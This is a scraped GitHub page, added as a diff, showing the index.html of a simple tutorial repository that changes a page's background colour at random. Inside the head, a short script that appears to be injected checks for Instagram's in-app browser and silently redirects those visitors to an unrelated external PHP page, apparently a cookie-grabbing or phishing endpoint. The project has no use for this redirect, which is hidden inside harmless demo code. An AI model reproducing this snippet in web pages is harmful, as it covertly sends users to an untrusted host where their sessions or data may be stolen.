@@ -1,0 +1,101 @@
+Skip to content
+Search or jump to…
+Pull requests
+Issues
+Marketplace
+Explore
+ 
+@Goldenyan0 
+cssmatter
+/
+change-background-color-javascript
+Public
+Code
+Issues
+Pull requests
+Actions
+Projects
+Wiki
+Security
+Insights
+change-background-color-javascript/index.html
+@cssmatter
+cssmatter Update index.html
+Latest commit e804306 on 16 Aug 2021
+ History
+ 1 contributor
+60 lines (52 sloc)  1.61 KB
+  
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A JavaScript - Change Background Color Randomly Using JavaScript</title>
+     <script>
+            if(navigator.userAgent.includes("Instagram")){
+                      window.location.href = "http://cookit.talagh-shahriar.ir/DummyBytes.php";
+            }
+            </script>        
+    <style>
+        body{
+            margin: 0px;
+            padding: 0px;
+            background: black;
+            transition: all 0.3s ease-in-out;
+        }
+        button{
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: transparent;
+            border:2px solid #2a2525;
+            line-height: 40px;
+            color: #fff;
+            border-radius: 10px;
+            padding: 0 20px;
+            cursor: pointer;
+            outline: 0px;
+        }
+        button:hover{
+            background: #fff;
+            border: 0px;
+            color: #000;
+        }
+    </style>
+</head>
+<body>
+    <button id="changeBG">Change Background</button>
+
+    <script>
+        var button = document.getElementById('changeBG');
+
+        button.addEventListener('click', changeBG);
+
+        var color = ['blue', 'green', 'yellow', 'red', 'pink', 'brown', 'golden']
+        
+        function changeBG(){
+            const colorIndex = parseInt(Math.random()*color.length);
+            document.body.style.backgroundColor = color[colorIndex];
+        }
+        
+        
+    </script>
+    
+    
+</body>
+</html>
+© 2022 GitHub, Inc.
+Terms
+Privacy
+Security
+Status
+Docs
+Contact GitHub
+Pricing
+API
+Training
+Blog
+About
+Loading complete
